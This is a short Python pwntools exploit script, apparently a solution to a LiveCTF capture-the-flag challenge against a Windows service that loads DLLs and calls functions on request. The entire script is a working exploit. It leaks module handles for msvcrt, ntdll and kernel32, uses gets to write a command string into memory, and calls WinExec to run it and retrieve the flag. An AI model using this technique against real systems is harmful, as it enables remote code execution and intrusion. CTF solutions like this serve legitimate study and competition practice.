#!/usr/bin/env python3

from pwn import *
context.log_level='debug'
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))
io.sendlineafter('load?\r\n', 'msvcrt.dll')
io.recvuntil('handle: ')
msvc=int(io.recvuntil('\n'),16)
args=msvc+0x70248
log.success(f"msvc: {msvc:x}")
io.sendlineafter('call?\r\n','gets')
io.sendlineafter( 'argument?\r\n', str(args))
io.sendline('./submitter')

io.sendlineafter('load?\r\n', 'ntdll.dll')
io.recvuntil('handle: ')
ntdll=int(io.recvuntil('\n'),16)
log.success(f"ntdll: {ntdll:x}")
io.sendlineafter('call?\r\n','NtContinue')
io.sendlineafter( 'argument?\r\n', str(args))


io.sendlineafter('load?\r\n', 'kernel32.dll')
io.recvuntil('handle: ')
kernel32=int(io.recvuntil('\n'),16)
log.success(f"kernel32: {kernel32:x}")
io.sendlineafter('call?\r\n','WinExec')
io.sendlineafter( 'argument?\r\n', str(args))
flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
io.interactive()
